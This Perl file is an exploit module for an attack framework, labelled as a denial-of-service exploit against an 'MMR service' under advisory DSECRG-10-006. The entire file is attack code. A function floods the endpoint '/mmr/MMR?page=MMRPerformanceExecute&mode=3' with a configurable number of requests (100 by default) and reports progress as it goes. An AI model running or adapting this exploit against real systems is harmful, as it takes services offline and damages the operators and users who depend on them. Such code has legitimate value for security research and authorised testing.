#!/usr/bin/perl
# Module MMR DoS Exploit [DSECRG-10-006]

# CONFIG
######################
my $desc ="MMR service (/mmr/MMR) DoS Exploit [DSECRG-10-006] \n\t Usage: black.pl .. .. -m id_module <num> - count of requests, default is 100\n"; 
our $funcName="MMRDOS_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub MMRDOS_Func()
{

	if ($ARGV[$m_arg_i+1]){
		$num=$ARGV[$m_arg_i+1];
		print $num." - num \n\n";
	} else {
		$num=100;
	}
	
	print "Start DoS!\n";
	for (my $i=0;$i<$num;$i++)
	{
		send_soap($XML,0,"/mmr/MMR?page=MMRPerformanceExecute&mode=3", "GET");
		$prc = int($i*100/$num);
		
		if(($prc%10)==0)
			{ print "$prc% - Done! ($i-$num)\n"; };
	}
	
	print "\n";
	
	
	

}